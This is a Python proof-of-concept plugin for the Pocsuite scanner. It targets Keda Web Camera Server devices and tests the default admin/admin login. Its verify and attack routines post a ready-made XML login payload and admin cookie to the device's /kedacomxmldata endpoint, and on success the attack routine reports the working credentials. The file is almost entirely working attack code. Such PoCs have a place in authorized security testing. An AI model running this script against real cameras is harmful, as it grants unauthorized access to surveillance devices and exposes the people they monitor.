#!/usr/bin/env python
# coding: utf-8

import re

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


# 登录后未注销,所以导致不可连续测试,否则失败


class TestPOC(POCBase):
    vulID = '1771'  # vul ID
    version = '1'
    author = ['马健']
    vulDate = '2015-04-15'
    createDate = '2015-04-15'
    updateDate = '2015-04-15'
    references = ['']
    name = 'Keda Web Camera Server 弱口令漏洞 POC'
    appPowerLink = 'http://www.kedacom.com/'
    appName = 'Keda Web Camera Server'
    appVersion = ''
    vulType = 'Weak Password'
    desc = '''
           Keda Web Camera Server 设备存在默认弱口令http登录admin/admin
    '''
    # the sample sites for examine
    samples = ['']

    def _verify(self):
        result = {}
        self.headers["Cookie"] = "remember=yes; psw=admin; user=admin"

        target_url = "/kedacomxmldata"
        payload = '<?xml version = "1.0" encoding = "gb2312"?><mtgweb><command>registreq</command><username>admin</username><password>admin</password></mtgweb>'
        response = req.post(self.url + target_url, data=payload, headers=self.headers, timeout=10)
        content = response.content

        match = re.search('<errorcode>0</errorcode>', content)

        if match:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)

    def _attack(self):
        result = {}
        self.headers["Cookie"] = "remember=yes; psw=admin; user=admin"

        target_url = "/kedacomxmldata"
        payload = '<?xml version = "1.0" encoding = "gb2312"?><mtgweb><command>registreq</command><username>admin</username><password>admin</password></mtgweb>'
        response = req.post(self.url + target_url, data=payload, headers=self.headers, timeout=10)
        content = response.content

        match = re.search('<errorcode>0</errorcode>', content)

        if match:
            result['AdminInfo'] = {}
            result['AdminInfo']['Username'] = 'admin'
            result['AdminInfo']['Password'] = 'admin'

        return self.parse_attack(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
